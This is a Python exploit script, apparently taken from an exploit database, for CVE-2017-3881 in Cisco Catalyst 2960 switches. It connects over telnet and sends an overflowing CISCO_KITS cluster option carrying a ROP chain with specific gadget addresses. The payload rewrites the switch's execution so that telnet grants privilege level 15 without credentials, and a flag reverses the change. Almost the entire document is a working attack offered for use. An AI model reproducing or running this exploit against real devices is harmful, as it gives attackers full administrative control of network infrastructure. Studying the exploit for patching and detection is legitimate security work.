# Exploit Title: Cisco Catalyst 2960 - Buffer Overflow
# Exploit Details: https://artkond.com/2017/04/10/cisco-catalyst-remote-code-execution/
# Date: 04.10.2017
# Exploit Author: https://twitter.com/artkond
# Vendor Homepage: https://www.cisco.com/
# Version: IOS version c2960-lanbasek9-mz.122-55.SE11)
# Tested on: Catalyst 2960 with IOS version c2960-lanbasek9-mz.122-55.SE11
# CVE : CVE-2017-3881
# Description:
#
# The exploit connects to the Catalyst switch and patches
# it execution flow to allow credless telnet interaction 
# with highest privilege level
#
 
 
import socket
import sys
from time import sleep
 
set_credless = True
 
if len(sys.argv) < 3:
    print sys.argv[0] + &#039; [host] --set/--unset&#039;
    sys.exit()
elif sys.argv[2] == &#039;--unset&#039;:
    set_credless = False
elif sys.argv[2] == &#039;--set&#039;:
    pass
else:
    print sys.argv[0] + &#039; [host] --set/--unset&#039;
    sys.exit()
 
 
s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 23))
 
print &#039;[+] Connection OK&#039;
print &#039;[+] Recieved bytes from telnet service:&#039;, repr(s.recv(1024))
print &#039;[+] Sending cluster option&#039;
print &#039;[+] Setting credless privilege 15 authentication&#039; if set_credless else &#039;[+] Unsetting credless privilege 15 authentication&#039;
 
 
 
payload = &#039;\xff\xfa\x24\x00&#039;
payload += &#039;\x03CISCO_KITS\x012:&#039;
payload += &#039;A&#039; * 116
payload += &#039;\x00\x00\x37\xb4&#039;       # first gadget address 0x000037b4: lwz r0, 0x14(r1); mtlr r0; lwz r30, 8(r1); lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
#next bytes are shown as offsets from r1
payload += &#039;\x02\x3d\x55\xdc&#039;       # +8  address of pointer to is_cluster_mode function - 0x34
if set_credless is True:
    payload += &#039;\x00\x00\x99\x9c&#039;   # +12 set  address of func that rets 1
else:
    payload +=  &#039;\x00\x04\xeA\xe0&#039;  # unset 
payload += &#039;BBBB&#039;                   # +16(+0) r1 points here at second gadget
payload += &#039;\x00\xe1\xa9\xf4&#039;       # +4 second gadget address 0x00e1a9f4: stw r31, 0x138(r30); lwz r0, 0x1c(r1); mtlr r0; lmw r29, 0xc(r1); addi r1, r1, 0x18; blr;
payload += &#039;CCCC&#039;                   # +8 
payload += &#039;DDDD&#039;                   # +12
payload += &#039;EEEE&#039;                   # +16(+0) r1 points here at third gadget
payload += &#039;\x00\x06\x7b\x5c&#039;       # +20(+4) third gadget address. 0x00067b5c: lwz r9, 8(r1); lwz r3, 0x2c(r9); lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; blr; 
payload += &#039;\x02\x3d\x55\xc8&#039;       # +8  r1+8 = 0x23d55c8
payload += &#039;FFFF&#039;                   # +12 
payload += &#039;GGGG&#039;                   # +16(+0) r1 points here at fourth gadget 
payload += &#039;\x00\x6c\xb3\xa0&#039;       # +20(+4) fourth gadget address 0x006cb3a0: lwz r31, 8(r1); lwz r30, 0xc(r1); addi r1, r1, 0x10; lwz r0, 4(r1); mtlr r0; blr;
if set_credless:
    payload += &#039;\x00\x27\x0b\x94&#039;   # +8 address of the replacing function that returns 15 (our desired privilege level). 0x00270b94: li r3, 0xf; blr; 
else:
    payload += &#039;\x00\x04\xe7\x78&#039;   # unset
payload += &#039;HHHH&#039;                   # +12
payload += &#039;IIII&#039;                   # +16(+0) r1 points here at fifth gadget
payload += &#039;\x01\x4a\xcf\x98&#039;       # +20(+4) fifth gadget address 0x0148e560: stw r31, 0(r3); lwz r0, 0x14(r1); mtlr r0; lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
payload += &#039;JJJJ&#039;                   # +8 r1 points here at third gadget
payload += &#039;KKKK&#039;                   # +12
payload += &#039;LLLL&#039;                   # +16
payload += &#039;\x01\x14\xe7\xec&#039;       # +20 original execution flow return addr
payload += &#039;:15:&#039; +  &#039;\xff\xf0&#039;
 
s.send(payload)
 
print &#039;[+] All done&#039;
 
s.close()

